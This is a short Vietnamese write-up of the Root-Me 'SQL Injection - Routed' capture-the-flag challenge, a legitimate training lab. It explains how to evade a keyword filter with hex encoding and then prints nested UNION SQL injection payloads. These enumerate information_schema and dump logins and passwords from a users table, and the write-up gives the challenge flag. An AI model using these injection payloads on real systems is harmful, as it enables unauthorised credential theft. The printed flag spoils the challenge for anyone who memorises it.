# Write up challenge SQL Injection - Routed

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>

  
[Link Challenge](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)<br>
</br>

Truy cập challenge và hực hiện kiểm tra tương tự các bước basic ta phát hiện challenge filter "or" hay 'order by'

<img src="./img/1.png" alt="normal_acc_TRAbID"/>

Cũng đơn giản thôi ta sẽ chuyển chúng sang hex. Sử dụng trang web chuyển online này 
https://gchq.github.io/CyberChef/


<br> Như casc bài trước thực hiện để kiểm tra số cột cho phép. Đến `1 order by 3--` thì bị lỗi 

<img src="./img/2.png" alt="normal_acc_TRAbID"/>

Vậy là database này có 2 cột. Tiếp theo select các table name trong bảng information_schema:

<img src="./img/3.png" alt="normal_acc_TRAbID"/>

<img src="./img/4.png" alt="normal_acc_TRAbID"/>


Lấy giá trị từ table users  thực hiện chuyển sang hex tương tự như trên `0' union select ' union select 1,column_name from information_schema.columns where table_name=N'users' -- - -- -`. 

Tìm cột tiếp theo 
`0' union select 1,column_name from information_schema.columns where table_name=N'users' AND columu_name !=N'id' -- - -- -`

<img src="./img/5.png" alt="normal_acc_TRAbID"/>

Tương tự tìm tiếp cột 

<img src="./img/55.png" alt="normal_acc_TRAbID"/>

Tiến hành select 2 cột tìm được trong users: `0' union select ' union select 1,concat(login,password) from users -- - -- -`

<img src="./img/6.png" alt="normal_acc_TRAbID"/>

Tiến hành login 

<img src="./img/7.png" alt="normal_acc_TRAbID"/>

Submit thành công 

<img src="./img/8.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** qs89QdAs9A




